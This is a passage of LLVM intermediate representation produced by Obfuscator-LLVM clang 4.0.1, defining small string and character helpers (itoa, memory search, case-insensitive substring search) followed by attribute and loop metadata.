; <label>:2:                                      ; preds = %1
  br label %3

; <label>:3:                                      ; preds = %1, %1, %1, %2
  %4 = phi i32 [ 1, %1 ], [ 0, %2 ], [ 1, %1 ], [ 1, %1 ]
  ret i32 %4
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define internal fastcc i32 @util_isdigit(i8 signext) unnamed_addr #8 {
  %.off = add i8 %0, -48
  %2 = icmp ult i8 %.off, 10
  %3 = zext i1 %2 to i32
  ret i32 %3
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define internal fastcc i32 @util_isalpha(i8 signext) unnamed_addr #8 {
  %2 = and i8 %0, -33
  %3 = add i8 %2, -65
  %4 = icmp ult i8 %3, 26
  %5 = zext i1 %4 to i32
  ret i32 %5
}

; Function Attrs: noinline norecurse nounwind readnone uwtable
define internal fastcc i32 @util_isupper(i8 signext) unnamed_addr #8 {
  %.off = add i8 %0, -65
  %2 = icmp ult i8 %.off, 26
  %3 = zext i1 %2 to i32
  ret i32 %3
}

; Function Attrs: noinline norecurse nounwind uwtable
define i8* @util_itoa(i32, i32, i8*) local_unnamed_addr #9 {
  %4 = alloca [34 x i8], align 16
  %5 = icmp eq i8* %2, null
  br i1 %5, label %33, label %6

; <label>:6:                                      ; preds = %3
  %7 = icmp eq i32 %0, 0
  br i1 %7, label %31, label %8

; <label>:8:                                      ; preds = %6
  %9 = getelementptr inbounds [34 x i8], [34 x i8]* %4, i64 0, i64 33
  store i8 0, i8* %9, align 1
  %10 = icmp eq i32 %1, 10
  %11 = icmp slt i32 %0, 0
  %or.cond = and i1 %11, %10
  %12 = sub nsw i32 0, %0
  %.29 = select i1 %or.cond, i32 %12, i32 %0
  %13 = icmp eq i32 %.29, 0
  br i1 %13, label %select.unfold._crit_edge, label %select.unfold.preheader

select.unfold.preheader:                          ; preds = %8
  br label %select.unfold

select.unfold:                                    ; preds = %select.unfold.preheader, %select.unfold
  %indvars.iv = phi i64 [ %indvars.iv.next, %select.unfold ], [ 32, %select.unfold.preheader ]
  %.031 = phi i32 [ %19, %select.unfold ], [ %.29, %select.unfold.preheader ]
  %14 = urem i32 %.031, %1
  %15 = icmp slt i32 %14, 10
  %.sink = select i1 %15, i32 48, i32 55
  %16 = add nsw i32 %.sink, %14
  %17 = trunc i32 %16 to i8
  %18 = getelementptr inbounds [34 x i8], [34 x i8]* %4, i64 0, i64 %indvars.iv
  store i8 %17, i8* %18, align 1
  %19 = udiv i32 %.031, %1
  %indvars.iv.next = add i64 %indvars.iv, -1
  %20 = icmp ult i32 %.031, %1
  br i1 %20, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  %21 = trunc i64 %indvars.iv.next to i32
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %8
  %.025.lcssa = phi i32 [ 32, %8 ], [ %21, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond, label %22, label %25

; <label>:22:                                     ; preds = %select.unfold._crit_edge
  %23 = sext i32 %.025.lcssa to i64
  %24 = getelementptr inbounds [34 x i8], [34 x i8]* %4, i64 0, i64 %23
  store i8 45, i8* %24, align 1
  br label %27

; <label>:25:                                     ; preds = %select.unfold._crit_edge
  %26 = add nsw i32 %.025.lcssa, 1
  br label %27

; <label>:27:                                     ; preds = %25, %22
  %.1 = phi i32 [ %.025.lcssa, %22 ], [ %26, %25 ]
  %28 = sext i32 %.1 to i64
  %29 = getelementptr inbounds [34 x i8], [34 x i8]* %4, i64 0, i64 %28
  %30 = call i32 @util_strcpy(i8* nonnull %2, i8* %29)
  br label %33

; <label>:31:                                     ; preds = %6
  store i8 48, i8* %2, align 1
  %32 = getelementptr inbounds i8, i8* %2, i64 1
  store i8 0, i8* %32, align 1
  br label %33

; <label>:33:                                     ; preds = %27, %31, %3
  %.027 = phi i8* [ null, %3 ], [ %2, %31 ], [ %2, %27 ]
  ret i8* %.027
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_memsearch(i8* nocapture readonly, i32, i8* nocapture readonly, i32) local_unnamed_addr #5 {
  %5 = icmp sle i32 %3, %1
  %6 = icmp sgt i32 %1, 0
  %or.cond = and i1 %5, %6
  br i1 %or.cond, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %7 = sext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %20
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %20 ]
  %.016 = phi i32 [ 0, %.lr.ph.preheader ], [ %.1, %20 ]
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %9 = load i8, i8* %8, align 1
  %10 = sext i32 %.016 to i64
  %11 = getelementptr inbounds i8, i8* %2, i64 %10
  %12 = load i8, i8* %11, align 1
  %13 = icmp eq i8 %9, %12
  br i1 %13, label %14, label %20

; <label>:14:                                     ; preds = %.lr.ph
  %15 = add nsw i32 %.016, 1
  %16 = icmp eq i32 %15, %3
  br i1 %16, label %17, label %20

; <label>:17:                                     ; preds = %14
  %18 = trunc i64 %indvars.iv to i32
  %19 = add nsw i32 %18, 1
  br label %.loopexit

; <label>:20:                                     ; preds = %.lr.ph, %14
  %.1 = phi i32 [ %15, %14 ], [ 0, %.lr.ph ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %21 = icmp slt i64 %indvars.iv.next, %7
  br i1 %21, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %20
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %4, %17
  %.013 = phi i32 [ %19, %17 ], [ -1, %4 ], [ -1, %.loopexit.loopexit ]
  ret i32 %.013
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @util_stristr(i8*, i32, i8* nocapture readonly) local_unnamed_addr #5 {
  %4 = tail call i32 @util_strlen(i8* %2)
  %5 = icmp sgt i32 %1, 0
  br i1 %5, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %.in = phi i32 [ %6, %.backedge ], [ %1, %.lr.ph.preheader ]
  %.026 = phi i32 [ %.0.be, %.backedge ], [ 0, %.lr.ph.preheader ]
  %.02125 = phi i8* [ %7, %.backedge ], [ %0, %.lr.ph.preheader ]
  %6 = add nsw i32 %.in, -1
  %7 = getelementptr inbounds i8, i8* %.02125, i64 1
  %8 = load i8, i8* %.02125, align 1
  %9 = sext i32 %.026 to i64
  %10 = getelementptr inbounds i8, i8* %2, i64 %9
  %11 = load i8, i8* %10, align 1
  %.off = add i8 %8, -65
  %12 = icmp ult i8 %.off, 26
  %13 = or i8 %8, 96
  %14 = select i1 %12, i8 %13, i8 %8
  %.off24 = add i8 %11, -65
  %15 = icmp ult i8 %.off24, 26
  %16 = or i8 %11, 96
  %17 = select i1 %15, i8 %16, i8 %11
  %18 = icmp eq i8 %14, %17
  br i1 %18, label %19, label %.backedge

; <label>:19:                                     ; preds = %.lr.ph
  %20 = add nsw i32 %.026, 1
  %21 = icmp eq i32 %20, %4
  br i1 %21, label %23, label %.backedge

.backedge:                                        ; preds = %19, %.lr.ph
  %.0.be = phi i32 [ %20, %19 ], [ 0, %.lr.ph ]
  %22 = icmp sgt i32 %.in, 1
  br i1 %22, label %.lr.ph, label %.loopexit.loopexit

; <label>:23:                                     ; preds = %19
  %24 = ptrtoint i8* %7 to i64
  %25 = ptrtoint i8* %0 to i64
  %26 = sub i64 %24, %25
  %27 = trunc i64 %26 to i32
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.backedge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %3, %23
  %.020 = phi i32 [ %27, %23 ], [ -1, %3 ], [ -1, %.loopexit.loopexit ]
  ret i32 %.020
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noinline norecurse nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { argmemonly nounwind }
attributes #7 = { noinline nounwind readonly uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noinline norecurse nounwind readnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noinline norecurse nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind }
attributes #11 = { nounwind readnone }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146842976}
!2 = !{i32 -2146842567}
!3 = distinct !{!3, !4, !5}
!4 = !{!"llvm.loop.vectorize.width", i32 1}
!5 = !{!"llvm.loop.interleave.count", i32 1}
!6 = distinct !{!6, !7, !4, !5}
!7 = !{!"llvm.loop.unroll.runtime.disable"}
!8 = distinct !{!8, !4, !5}
!9 = distinct !{!9, !7, !4, !5}
!10 = !{!11}
!11 = distinct !{!11, !12}
!12 = distinct !{!12, !"LVerDomain"}
!13 = !{!14}
!14 = distinct !{!14, !12}
!15 = distinct !{!15, !16}
!16 = !{!"llvm.loop.unroll.disable"}
!17 = distinct !{!17, !4, !5}
!18 = distinct !{!18, !16}
!19 = distinct !{!19, !4, !5}
